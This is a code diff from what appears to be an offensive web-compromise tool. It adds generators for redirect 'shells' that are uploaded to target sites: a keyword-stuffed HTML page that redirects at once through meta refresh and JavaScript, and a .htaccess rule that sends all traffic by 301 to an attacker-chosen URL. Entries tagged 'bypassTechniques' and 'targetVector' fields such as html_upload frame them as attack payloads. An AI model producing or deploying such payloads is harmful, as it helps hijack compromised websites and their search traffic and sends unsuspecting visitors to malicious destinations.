@@ -683,6 +683,70 @@ export async function generateShellsForTarget(
 //  UTILITY: Pick Best Shell for Vector
 // ═══════════════════════════════════════════════════════
 
+// ═══════════════════════════════════════════════════════
+//  EXPORTED: Individual Shell Generators for Auto-Fallback
+// ═══════════════════════════════════════════════════════
+
+export { generateMetaRedirectHtml, generateJsRedirect, generateHtaccessRedirect };
+
+// ═══════════════════════════════════════════════════════
+//  UTILITY: Generate Unconditional Redirect Shells
+//  (Always redirect — no referer/bot checks)
+// ═══════════════════════════════════════════════════════
+
+export function generateUnconditionalHtmlRedirect(redirectUrl: string, keywords: string[]): GeneratedShell {
+  const htmlContent = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>${keywords[0] || "Redirecting"}</title>
+<meta name="description" content="${keywords.join(", ")}">
+<meta name="keywords" content="${keywords.join(", ")}">
+<meta name="robots" content="index,follow">
+<meta http-equiv="refresh" content="0;url=${redirectUrl}">
+<link rel="canonical" href="${redirectUrl}">
+<script>window.location.replace("${redirectUrl}");</script>
+</head>
+<body>
+<h1>${keywords[0] || "Welcome"}</h1>
+<p>${keywords.join(". ")}. <a href="${redirectUrl}">Click here to continue</a>.</p>
+</body>
+</html>`;
+
+  return {
+    id: `unconditional_html_${randomStr(6)}`,
+    type: "redirect_html",
+    filename: `${randomStr(6)}.html`,
+    content: htmlContent,
+    contentType: "text/html",
+    description: "Unconditional HTML redirect (meta refresh + JS) — always redirects, no referer check",
+    targetVector: "html_upload",
+    bypassTechniques: ["meta_refresh", "js_redirect", "unconditional"],
+    redirectUrl,
+    seoKeywords: keywords,
+    verificationMethod: "Page should always redirect via meta refresh + JS",
+  };
+}
+
+export function generateUnconditionalHtaccessRedirect(redirectUrl: string): GeneratedShell {
+  const rules = `# Redirect
+Redirect 301 / ${redirectUrl}
+`;
+
+  return {
+    id: `unconditional_htaccess_${randomStr(6)}`,
+    type: "redirect_htaccess",
+    filename: ".htaccess",
+    content: rules,
+    contentType: "text/plain",
+    description: "Unconditional .htaccess 301 redirect — always redirects all traffic",
+    targetVector: "htaccess_upload",
+    bypassTechniques: ["301_redirect", "unconditional"],
+    redirectUrl,
+    seoKeywords: [],
+    verificationMethod: "Any request should return 301",
+  };
+}
+
 export function pickBestShell(shells: GeneratedShell[], vector: RankedAttackVector): GeneratedShell {
   // Match shell type to vector
   const typeMatch = shells.filter(s => {
